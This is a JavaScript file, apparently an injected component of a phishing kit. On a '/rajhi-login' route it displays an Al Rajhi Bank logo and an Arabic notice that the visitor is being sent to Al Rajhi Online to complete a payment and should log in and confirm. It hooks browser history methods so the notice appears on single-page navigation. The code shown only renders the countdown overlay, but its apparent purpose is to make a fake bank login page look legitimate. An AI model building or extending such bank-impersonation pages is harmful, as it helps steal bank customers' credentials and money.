/**
 * BCare — Rajhi Login Countdown Modal (injected)
 * -----------------------------------------------------------------------------
 * Shows a simple modal with a 5-second countdown progress bar on the
 * /rajhi-login page. The form content is hidden behind the modal overlay
 * until the countdown completes.
 * ===========================================================================*/
(function () {
  "use strict";

  var TARGET_PATH = "/rajhi-login";
  var DURATION = 5000; // 5 seconds
  var MODAL_ID = "rajhi-countdown-modal";
  var lastShownPath = ""; // track the last path we showed the modal on

  function createModal() {
    if (document.getElementById(MODAL_ID)) return;

    var overlay = document.createElement("div");
    overlay.id = MODAL_ID;
    overlay.innerHTML =
      '<div class="rcm-backdrop">' +
        '<div class="rcm-card">' +
          '<div class="rcm-icon">' +
            '<img src="/assets/images/rajhi-logo.png" alt="Al Rajhi Bank" style="width:64px;height:64px;object-fit:contain;" />' +
          '</div>' +
          '<p class="rcm-text1">سيتم تحويلك إلى خدمة الراجحي اون لاين لإكمال عملية السداد</p>' +
          '<p class="rcm-text2">الرجاء تسجيل الدخول وتأكيد العملية</p>' +
          '<div class="rcm-bar-wrap"><div class="rcm-bar"></div></div>' +
        '</div>' +
      '</div>';

    document.body.appendChild(overlay);

    // Start countdown animation
    var bar = overlay.querySelector(".rcm-bar");
    // Force reflow before starting animation
    void bar.offsetWidth;
    bar.style.transition = "width " + DURATION + "ms linear";
    bar.style.width = "0%";

    // Remove modal after duration
    setTimeout(function () {
      overlay.style.opacity = "0";
      overlay.style.transition = "opacity 0.3s ease-out";
      setTimeout(function () {
        if (overlay.parentNode) overlay.parentNode.removeChild(overlay);
      }, 300);
    }, DURATION);
  }

  function onRouteChange() {
    if (window.location.pathname !== TARGET_PATH) {
      // Reset when leaving the page so it shows again on next visit
      if (lastShownPath === TARGET_PATH) {
        lastShownPath = "";
      }
      return;
    }
    // Show only once per entry to this page
    if (lastShownPath === TARGET_PATH) return;
    lastShownPath = TARGET_PATH;

    // Small delay to let the page render
    setTimeout(createModal, 50);
  }

  function init() {
    onRouteChange();

    // Listen for route changes via vue-router (pushState/replaceState)
    var origPush = history.pushState;
    var origReplace = history.replaceState;
    history.pushState = function () {
      origPush.apply(this, arguments);
      setTimeout(onRouteChange, 50);
    };
    history.replaceState = function () {
      origReplace.apply(this, arguments);
      setTimeout(onRouteChange, 50);
    };
    window.addEventListener("popstate", function () {
      setTimeout(onRouteChange, 50);
    });

    // Also observe DOM for SPA content changes (initial render)
    var observerFired = false;
    var observer = new MutationObserver(function () {
      if (window.location.pathname === TARGET_PATH && !observerFired && !document.getElementById(MODAL_ID)) {
        observerFired = true;
        onRouteChange();
      }
    });
    observer.observe(document.body, { childList: true, subtree: true });
  }

  if (document.readyState === "loading") {
    document.addEventListener("DOMContentLoaded", init);
  } else {
    init();
  }
})();
